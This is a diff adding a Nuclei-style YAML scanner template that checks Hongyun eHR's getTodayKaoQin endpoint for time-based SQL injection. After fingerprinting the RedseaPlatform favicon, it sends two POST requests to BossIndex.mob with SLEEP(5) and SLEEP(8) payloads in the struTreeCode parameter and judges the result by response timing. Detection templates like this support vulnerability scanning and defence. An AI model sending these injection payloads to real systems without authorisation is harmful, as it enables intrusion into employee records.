@@ -1,0 +1,59 @@
+id: poc-yaml-hr-soft-gettodaykaoqin-sqli
+info:
+  name: 红海云eHR getTodayKaoQin SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 红海云eHR
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/RedseaPlatform/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "/RedseaPlatform/skins/images/favicon.ico"
+        part: body
+
+  - raw:
+      - |
+        POST /RedseaPlatform/BossIndex.mob HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        method=getTodayKaoQin&struTreeCode=%27+AND+(SELECT+3266+FROM+(SELECT(SLEEP(5)))ShXk)+AND+%27qmyT%27=%27qmyT
+      - |
+        POST /RedseaPlatform/BossIndex.mob HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        method=getTodayKaoQin&struTreeCode=%27+AND+(SELECT+3266+FROM+(SELECT(SLEEP(8)))ShXk)+AND+%27qmyT%27=%27qmyT
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"meg\":\"处理成功\""
+          - "\"jsonList\":"
+        part: body
+      - type: dsl
+        dsl:
+          - "!contains(body, '<')"
+      - type: word
+        words:
+          - "text/json"
+        part: header
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
